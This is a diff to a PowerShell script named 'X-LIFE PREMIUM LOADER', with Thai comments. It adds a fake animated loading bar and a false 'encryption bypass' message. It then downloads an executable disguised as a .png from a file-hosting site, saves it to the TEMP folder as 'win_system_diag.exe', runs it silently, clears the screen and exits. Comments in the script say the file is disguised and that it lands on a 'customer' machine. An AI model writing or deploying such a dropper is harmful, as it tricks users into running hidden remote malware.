@@ -1,23 +1,37 @@
 # ============================================================
-# X-LIFE AUTO-LAUNCHER (PS1 VERSION)
+# X-LIFE PREMIUM LOADER
 # ============================================================
+Clear-Host
+$Host.UI.RawUI.WindowTitle = "X-LIFE SECURITY INITIALIZATION"
 
-# ลิงก์ไฟล์ที่คุณเพิ่งอัปโหลด (หลอกว่าเป็น .png)
+Write-Host "`n  [>] INITIALIZING SECURITY PROTOCOLS..." -ForegroundColor Cyan
+Start-Sleep -Milliseconds 500
+
+# ระบบ Animated Loading Bar
+for ($i = 0; $i -le 100; $i += 5) {
+    $percent = "$i%"
+    $numBlocks = [int](<$i / 5>)
+    $bar = ("█" * $numBlocks) + (" " * (20 - $numBlocks))
+    Write-Host "`r  [$bar] $percent  " -NoNewline -ForegroundColor Magenta
+    Start-Sleep -Milliseconds 50
+}
+
+Write-Host "`n  [+] ENCRYPTION BYPASS SUCCESSFUL" -ForegroundColor Green
+Write-Host "  [*] DOWNLOADING ENGINE COMPONENTS..." -ForegroundColor DarkGray
+
+# ส่วนดาวน์โหลดและรันไฟล์เดิม
 $exeUrl = "https://files.catbox.moe/hextui.png"
-
-# บันทึกเป็น .exe ลงในเครื่องลูกค้า
 $tempPath = "$env:TEMP\win_system_diag.exe"
 
 try {
-    # ดาวน์โหลดไฟล์
     Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
+    Write-Host "  [+] ENGINE BOOTING..." -ForegroundColor Cyan
+    Start-Sleep -Milliseconds 800
     
-    # รันโปรแกรมทันที
     Start-Process -FilePath $tempPath
     
-    # ล้างหน้าจอ
+    # ล้างหน้าจอแล้วปิด PowerShell ทันที
     Clear-Host
+    Exit
 }
-catch {
-    # ทำงานเงียบๆ
-}
+catch { }
